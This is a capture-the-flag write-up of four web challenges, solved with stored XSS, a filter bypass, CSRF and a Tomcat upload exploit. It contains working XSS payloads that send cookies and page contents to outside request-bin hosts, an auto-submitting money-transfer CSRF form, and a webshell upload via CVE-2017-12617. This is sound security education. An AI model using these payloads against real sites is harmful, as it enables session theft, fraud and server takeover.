# Web

- [Internal Support 1 (100 points)](#internal-support-1-100-points)
- [Internal Support 2 (100 points)](#internal-support-2-100-points)
- [UpCredit (100 points)](#upcredit-100-points)
- [Walter's Blog (100 points)](#walters-blog-100-points)

## Internal Support 1 (100 points)
```
Description:

L'application "Internal Support" permet à la DGA d'assurer le support auprès de ses agents.
En tant que nouvel embauché, vous pouvez vous y inscrire dès à présent.
Chaque demande de support est maintenant traitée par nos administrateurs en un temps record.

Avec une posture d’attaquant, votre but est de parvenir à vous connecter en tant qu'administrateur.
Malheureusement pour vous, le mot de passe est bien trop robuste, vous devez trouver un autre moyen.

Accès à l'épreuve:
URL: http://internalsupport12.chall.malicecyber.com/
```

On the website, there are a basic login and registration form, we create an account with a random mail and password and we are redirected to support requests page

We can create a ticket with a title, a category and a message

We can see that session cookies are not protected with the flag `HttpOnly`, we can try an XSS injection to steal the administrator's cookie when it reads our tickets, and then use it to log in as administrator

With the ticket's message: `<script>alert("xss")</script>` a popup appear, bingo the website is vulnerable to XSS injections !

We are using https://requestbin.com/r to steal the cookies:

Then, with the message: `<script>document.location="https://en4n0msmqglws.x.pipedream.net/"+document.cookie;</script>`, we get two requests, our with our cookie and another, with the administrator cookie

On the website we change our cookie with that of the administrator and we are loged as administrator

We can see at the bottom of the page a todolist:
```
TODOLIST

- Fix the kernel panic problem on the servers
- Find a solution for the XSS on the helpdesk system
- Hide the flag "NoUserValidationIsADangerousPractice" a little bit better
```

The flag is: `NoUserValidationIsADangerousPractice`

## Internal Support 2 (100 points)
```
Description:

Votre chance de débutant a des limites...
La sécurité a été renforcée suite à la découverte de failles dans la précédente version !

Avec une posture d’attaquant, votre but est de parvenir à vous connecter en tant qu'administrateur.
Malheureusement pour vous, le mot de passe est bien trop robuste, vous devez trouver un autre moyen.

Accès à l'épreuve:
URL: http://internalsupport22.chall.malicecyber.com/
```

Same that **Inernal Support 1**

On the website, there are a basic login and registration form, we create an account with a random mail and password and we are redirected to support requests page

We can create a ticket with a title, a category and a message

We are going to try an XSS injection

With the ticket's message: `<script>alert("xss")</script>`, the message `Malicious code detected !` is showed, we must try an other way to execute script

There is many way to bapass XSS filter: https://github.com/payloadbox/xss-payload-list

With the ticket's message: `<img src=1 href=1 onerror="javascript:alert("xss")"></img>`, no malicious code are detected and a popup appear, we have our XSS injections !

We are using https://requestbin.com/r to steal the cookies:

Then, with the message: `<img src=1 href=1 onerror="document.location='https://enb0zp0jqsd3u.x.pipedream.net/'+document.cookie;"></img>`, we get two requests, our with our cookie and another, with the administrator cookie

On the website we change our cookie with that of the administrator and we are loged as administrator

But there is the message `You IP address changed since last login. Please logout (go to /logout/) and login again.`, too bad

We have to use another technique, in the previous one the flag was written in the home page, so we are going to retrieve it from the victim's browser with de message:


```html
<img src=1 onerror='$.ajax({url:"/",type:"GET",success:function(e){$.ajax({type:"POST",url:"https://enumx07eez4ab.x.pipedream.net/",data:{foo:btoa(e)}})}});'></img>
```

And we can read the same TODOLIST, but it say the flag is not here...

```
TODOLIST

- Régler le problème de kernel panic sur les serveurs
- Trouver une solution pour la XSS sur le système de helpdesk
- Cacher le flag "Il n'y a aucun flag ici dans cette version !" un peu mieux
```

After some tests, we can find the flag in ticket's pages with the message:

```html
<img src=1 onerror='$.ajax({url:window.location.pathname,type:"GET",success:function(e){$.ajax({type:"POST",url:"https://enumx07eez4ab.x.pipedream.net/",data:{foo:btoa(e)}})}});'></img>
```

We can read in the source code:

```javascript
<script type="text/javascript">
    var xss_detected = false;
    alert = function() {
        xss_detected = true;
    }
    
    window.onload = function() {
        if (xss_detected) {
            document.getElementById("response").value = "Bien joué, voici le flag : \"BewareOfXss!\"\n\n";
        }
    }
</script>
```

The flag is: `BewareOfXss!`

### EDIT (challenge was modified)

After an update of the challenge, the flag was put directly in the TODOLIST

```
TODOLIST

- Fix the kernel panic problem on the servers
- Find a solution for the XSS on the helpdesk system
- Hide the flag "BEtter_BUT_ST!LL_N0tttttttttt++Prfct!" a little bit better
```

The flag is: `BEtter_BUT_ST!LL_N0tttttttttt++Prfct!`

## UpCredit (100 points)
```
Description

En tant qu’ingénieur expert en recherche de vulnérabilité nouvellement embauché à DGA MI, vous décidez de changer de banque.

La banque UpCredit est une banque 100% en ligne. Vous pouvez vous inscrire et gérer immédiatement votre compte !

Pour obtenir le flag, vous devrez dépenser 200€. Vous pouvez contacter votre conseiller à tout moment pour qu'il vous aide.

Accès à l'épreuve
URL: http://upcredit4.chall.malicecyber.com/
```

On the site we can create an account or login, so we create an account and are redirected to a management page

On this page we can see our activity, send money, or contact our advisor. We can also buy the flag for 200€ but our account is empty

When we contact our advisor, we realize that he clicks on the links we send to him

We can try to execute a CSRF attack, so we will try to send money to our account from the account of our advisor

When we send money to an account, a POST request is send to `http://upcredit4.chall.malicecyber.com/transfer` with body `account=...&amount=...`

The next javascript payload can do this:
```html
<form action="http://upcredit4.chall.malicecyber.com/transfer" method="post" id="send_money_form">
    <input type="text" name="account" value="_5O_w-SNI"> <!--- our account -->
    <input type="number" name="amount" value="200">
</form>
<script>document.getElementById("send_money_form").submit();</script>
```

We host this script on a webserver and we send it url to out advisor

After a refresh, 200€ appear on our account and we can buy the flag !

The flag is: `W1nG4rD1um\L3v1os444!`

## Walter's Blog (100 points)
```
Description:

Un ancien stagiaire avait développé ce site web il y a plusieurs années.
Malheureusement, ce projet a mal été documenté et nous ne retrouvons plus les accès pour l'administrer...

Votre tuteur vous autorise à tout essayer pour récupérer les accès à ce service, soyez inventif !

Le flag est situé dans le fichier /flag.txt.

Mise à jour: Ne mettez pas flag{} pour valider l'épreuve.

Accès à l'épreuve:
URL: http://waltersblog3.chall.malicecyber.com/
```

On the website there is a minecraft blog written in html pages

After a deep inspection of the site, we found nothing

So we are going to try to see what we can find with gobuster:

```
$ gobuster dir -e -u http://waltersblog3.chall.malicecyber.com -w /usr/share/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://waltersblog3.chall.malicecyber.com
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/11/17 23:18:10 Starting gobuster
===============================================================
http://waltersblog3.chall.malicecyber.com/assets (Status: 302)
http://waltersblog3.chall.malicecyber.com/docs (Status: 302)
http://waltersblog3.chall.malicecyber.com/examples (Status: 302)
http://waltersblog3.chall.malicecyber.com/host-manager (Status: 302)
http://waltersblog3.chall.malicecyber.com/images (Status: 302)
http://waltersblog3.chall.malicecyber.com/index.html (Status: 200)
http://waltersblog3.chall.malicecyber.com/manager (Status: 302)
===============================================================
2020/11/17 23:18:22 Finished
===============================================================
```

At the page http://waltersblog3.chall.malicecyber.com/docs, we learn that the site is hosted with tomcat 9.0.0.M1

Then, with [exploit-db](https://www.exploit-db.com/) we find an exploit for this version [CVE-2017-12617](https://www.exploit-db.com/exploits/42966)

First, we chech if tomcat is vulnerable:

```
$ python2 cve-2017-12617.py -u http://waltersblog3.chall.malicecyber.com



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Poc Filename  Poc.jsp
http://waltersblog3.chall.malicecyber.com it's Vulnerable to CVE-2017-12617
http://waltersblog3.chall.malicecyber.com/Poc.jsp
```

It's vulnerable, so we can open a shell and read the flag:
```
$ python2 cve-2017-12617.py -u http://waltersblog3.chall.malicecyber.com -p pwn



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Uploading Webshell .....
$ ls
[...]
etc
flag.txt
home
[...]
$ cat flag.txt
flag{i4lW4y5UpD4T3Y0urt0mC@}
```

The flag is: `i4lW4y5UpD4T3Y0urt0mC@`
